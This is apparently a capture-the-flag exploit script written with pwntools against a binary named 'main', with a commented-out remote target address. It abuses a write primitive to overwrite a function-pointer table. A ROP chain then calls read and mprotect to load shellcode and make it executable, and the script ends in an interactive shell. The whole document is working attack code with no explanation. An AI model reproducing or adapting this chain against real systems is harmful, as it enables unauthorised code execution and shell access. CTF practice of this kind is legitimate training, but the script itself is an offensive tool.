from pwn import*
p = process('./main')
elf =ELF('./main')
context(arch='amd64',os='linux',log_level ='DEBUG')
#p = remote('183.129.189.60',10008)
def m(address,content):
	p.sendlineafter('addr:',p64(address))
	p.sendafter('data:',content)

m(0x4B50B0,p64(0x402CA0) + p64(0x401C1D))

pop_rdx_rsi = 0x44AB09
mov_rax_rdx = 0x41AE80
pop_rdi_ret = 0x401746
pop_rdx_ret = 0x447635
leave_ret = 0x401CF3
ret = 0x401016
mprotect = 0x448420
read = 0x447620

shell_a = 0x4BC100
shell = asm(shellcraft.sh())
m(0x4B50B0 + 0x10,p64(pop_rdi_ret) + p64(0) + p64(pop_rdx_rsi))
m(0x4B50B0 + 0x10 + 0x18,p64(0x200) + p64(shell_a) + p64(read))
m(0x4B50B0 + 0x10 + 0x18 + 0x18,p64(pop_rdi_ret) + p64(shell_a -0x100) + p64(pop_rdx_rsi))
m(0x4B50B0 + 0x10 + 0x18 + 0x18 + 0x18,p64(7) + p64(0x1000) + p64(mprotect))
m(0x4B50B0 + 0x10 + 0x18 + 0x18 + 0x18 + 0x18,p64(shell_a))
m(0x4B50B0,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))

p.sendline(shell)
p.interactive()
